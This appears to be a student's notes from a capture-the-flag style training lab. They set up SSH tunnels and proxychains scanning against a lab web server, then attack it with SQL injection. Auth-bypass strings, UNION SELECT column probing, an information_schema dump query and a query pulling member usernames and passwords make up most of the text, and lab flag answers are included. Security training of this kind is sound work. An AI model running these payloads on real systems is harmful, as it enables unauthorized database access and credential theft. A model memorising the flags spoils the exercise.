# 2 encoding methods
- base64
- rot13(Windows)

## Create Admin User (8): No Collaboration

Donovian Database Exploitation (DWDBE)
XX Dec 2026
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.

Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 
```
5QL1nj3ct5t@rt0F@ct1v1ty 
```

Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.
```
Scheme of Maneuver:
>Jump Box: 10.50.37.98	
->T1:10.100.28.48
```
```
Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: Apache/2.4.29 (Ubuntu) Server
Creds:unknown
Last Known SSH Port: 4444
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
```

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
---------------------------------------------|
	* if no socket file then, make one.  |
ssh -MS /tmp/jump student@10.50.37.98	     |
				^ jump IP    |
					     |
	* if no dynamic port, make one.      |
ssh -S /tmp/jump jump -O forward -D 9050     |
---------------------------------------------|
```

# On lin-ops
Recon: Utilize pro
* after getting the dynamic tunnel running 
```
proxychains nmap 10.100.28.48
proxychains nc 10.100.28.40 {ports[s]}
proxychains nmap --script http-enum 10.100.28.48
```
* results for ^
```
Nmap scan report for 10.100.28.48
Host is up (0.00041s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
```

* utilize nikto
```
proxychains nikto v -h 10.100.28.48
```
* nikto results:
```
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2024-09-19 17:07:29 (GMT0) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

* check your connections
```
ss- ntlp
```
* Leveraging your existing Socket /tmp/jump, make a port forward targeting the Target's vulnerable ports
```
ssh -S /tmp/jump jump -O forward -L 127.0.0.1:1111:10.100.28.48:80
```
* then open a firefox web browser
```
firefox
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# On firefox:
* navigate to the device via the Port Forward you added to you Socket File:
```
127.0.0.1:1111
```
* Enumerating the directories discovered in your htt-enum script
```
127.0.0.1:1111/css
127.0.0.1:1111/images
127.0.0.1:1111/includes
127.0.0.1:1111/js
127.0.0.1:1111/scripts
```
## SQL Injections via HTTP POST/GET request methods

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# POST Method (Interacting with input fields)
### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4: Craft more tailored queries



## step 1: Determine the vulnerable field
```
{option}' OR 1='1
```
* result: 
```
Congratulations { 4nGfU !

You are now logged in the website. 
```
* repeat step 1 but this time with the developer console open, using these options.
  - Network
    - POST
      - Request
        - Raw (radio button) 
* append the "Request payload" to the end of the current URL, with a ?
```
127.0.0.1{port}/webpage[s]?"Request payload"
```

## step 2: Identify number of columns
```
{option}' UNION SELECT 1,2,3,4 #
{option}' UNION SELECT 1,2,3,4,5 #
```
## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)

* 4 columns displayed, column 2 hidden
```
UNION SELECT table_schema,table_name,column_name from information_schema.columns #
```
```
UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
```
## step 4:  Craft more tailored queries

```
'{option:Audi} 'UNION SELECT TYPE,2,cost,color,year from session.car #'
```
```
'Audi ' UNION SELECT carid,2,type,name,year from session.car #'
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# GET Method (Interact with URL)

### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4:  Craft more tailored queries



## step 1: Determine the vulnerable field
- Choose {option} from radio button, then click submit
  - interact with url:
```
' OR 1='1

{option}' OR 1='1
```


## step 2: Identify number of columns
example syntax:
```
{category}={unsanitized options} UNION SELECT {1,2,3: subject to change}
```

* Only increment columns until you get, a valid output. 

## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
``` 
UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
## step 4:  Craft more tailored queries
``` 
UNION SELECT table_schema,column_name,table_name from information_schema.columns
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
q1
# DNLA Category
* flag: tSpcYMgvZQsxrxd2EpC5
```
5
Level II Challenge

On the DNLA site identify the flag using the Categories page.

To answer input the characters inside the flag.
```

* options 1-13 

# GET Method (Interact with URL)

### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4:  Craft more tailored queries


### step 1: Determine the vulnerable field
- GET request * NO quotes
```
	127.0.0.1:1111/cases/productsCategory.php?category=1 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=2 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=3 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=4 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=5 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=6 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=7 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=8 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=9 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=10 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=11 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=12 OR 1=1
	127.0.0.1:1111/cases/productsCategory.php?category=13 OR 1=1
```
* None of them do input validation 1-13

### step 2: Identify number of columns
```
127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT 1,2,3
```
* Before utilizing the Golden statement, check the oreder of the columns,
*  
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
``` 
UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
copy and paste into the vulnerable parameter:
```
127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
* Results from the Golden Statement:
```
sqlinjection	categories	id
sqlinjection	categories	name
sqlinjection	categories	description

sqlinjection	members		id
sqlinjection	members		username
sqlinjection	members		password
sqlinjection	members		first_name
sqlinjection	members		last_name
sqlinjection	members		email
sqlinjection	members		permission

sqlinjection	orderlines	id
sqlinjection	orderlines	quantity
sqlinjection	orderlines	product
sqlinjection	orderlines	order

sqlinjection	orders		id
sqlinjection	orders		date
sqlinjection	orders		member

sqlinjection	payments	id
sqlinjection	payments	creditcard_number
sqlinjection	payments	date
sqlinjection	payments	order

sqlinjection	permissions	id
sqlinjection	permissions	level
sqlinjection	permissions	name
sqlinjection	permissions	description

sqlinjection	products	id
sqlinjection	products	name
sqlinjection	products	description
sqlinjection	products	price
sqlinjection	products	qty_left
sqlinjection	products	category

sqlinjection	share4		id
sqlinjection	share4		comment
sqlinjection	share4		mime
sqlinjection	share4		data
```

Golden Rule:
```
127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
### step 4:  Craft more tailored queries
q3 * Provide the password for users with administrator access to the DNLA database. To answer input the flag.
```
127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT username,password,permission from sqlinjection.members
```
q4 * Utilizing the Search page on DNLA, identify the vulnerability to find the flag. To answer input only the characters inside the flag.
```
' OR 1='1
```
q5 * 

Identify the version of the database that DNLA is utilizing.To answer input the full version.
```

```
q6 * Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.
```

```
q7 * Find the flag associated with id 1337.
```

```
q8 * Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
(meh !! I ain't pressed)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
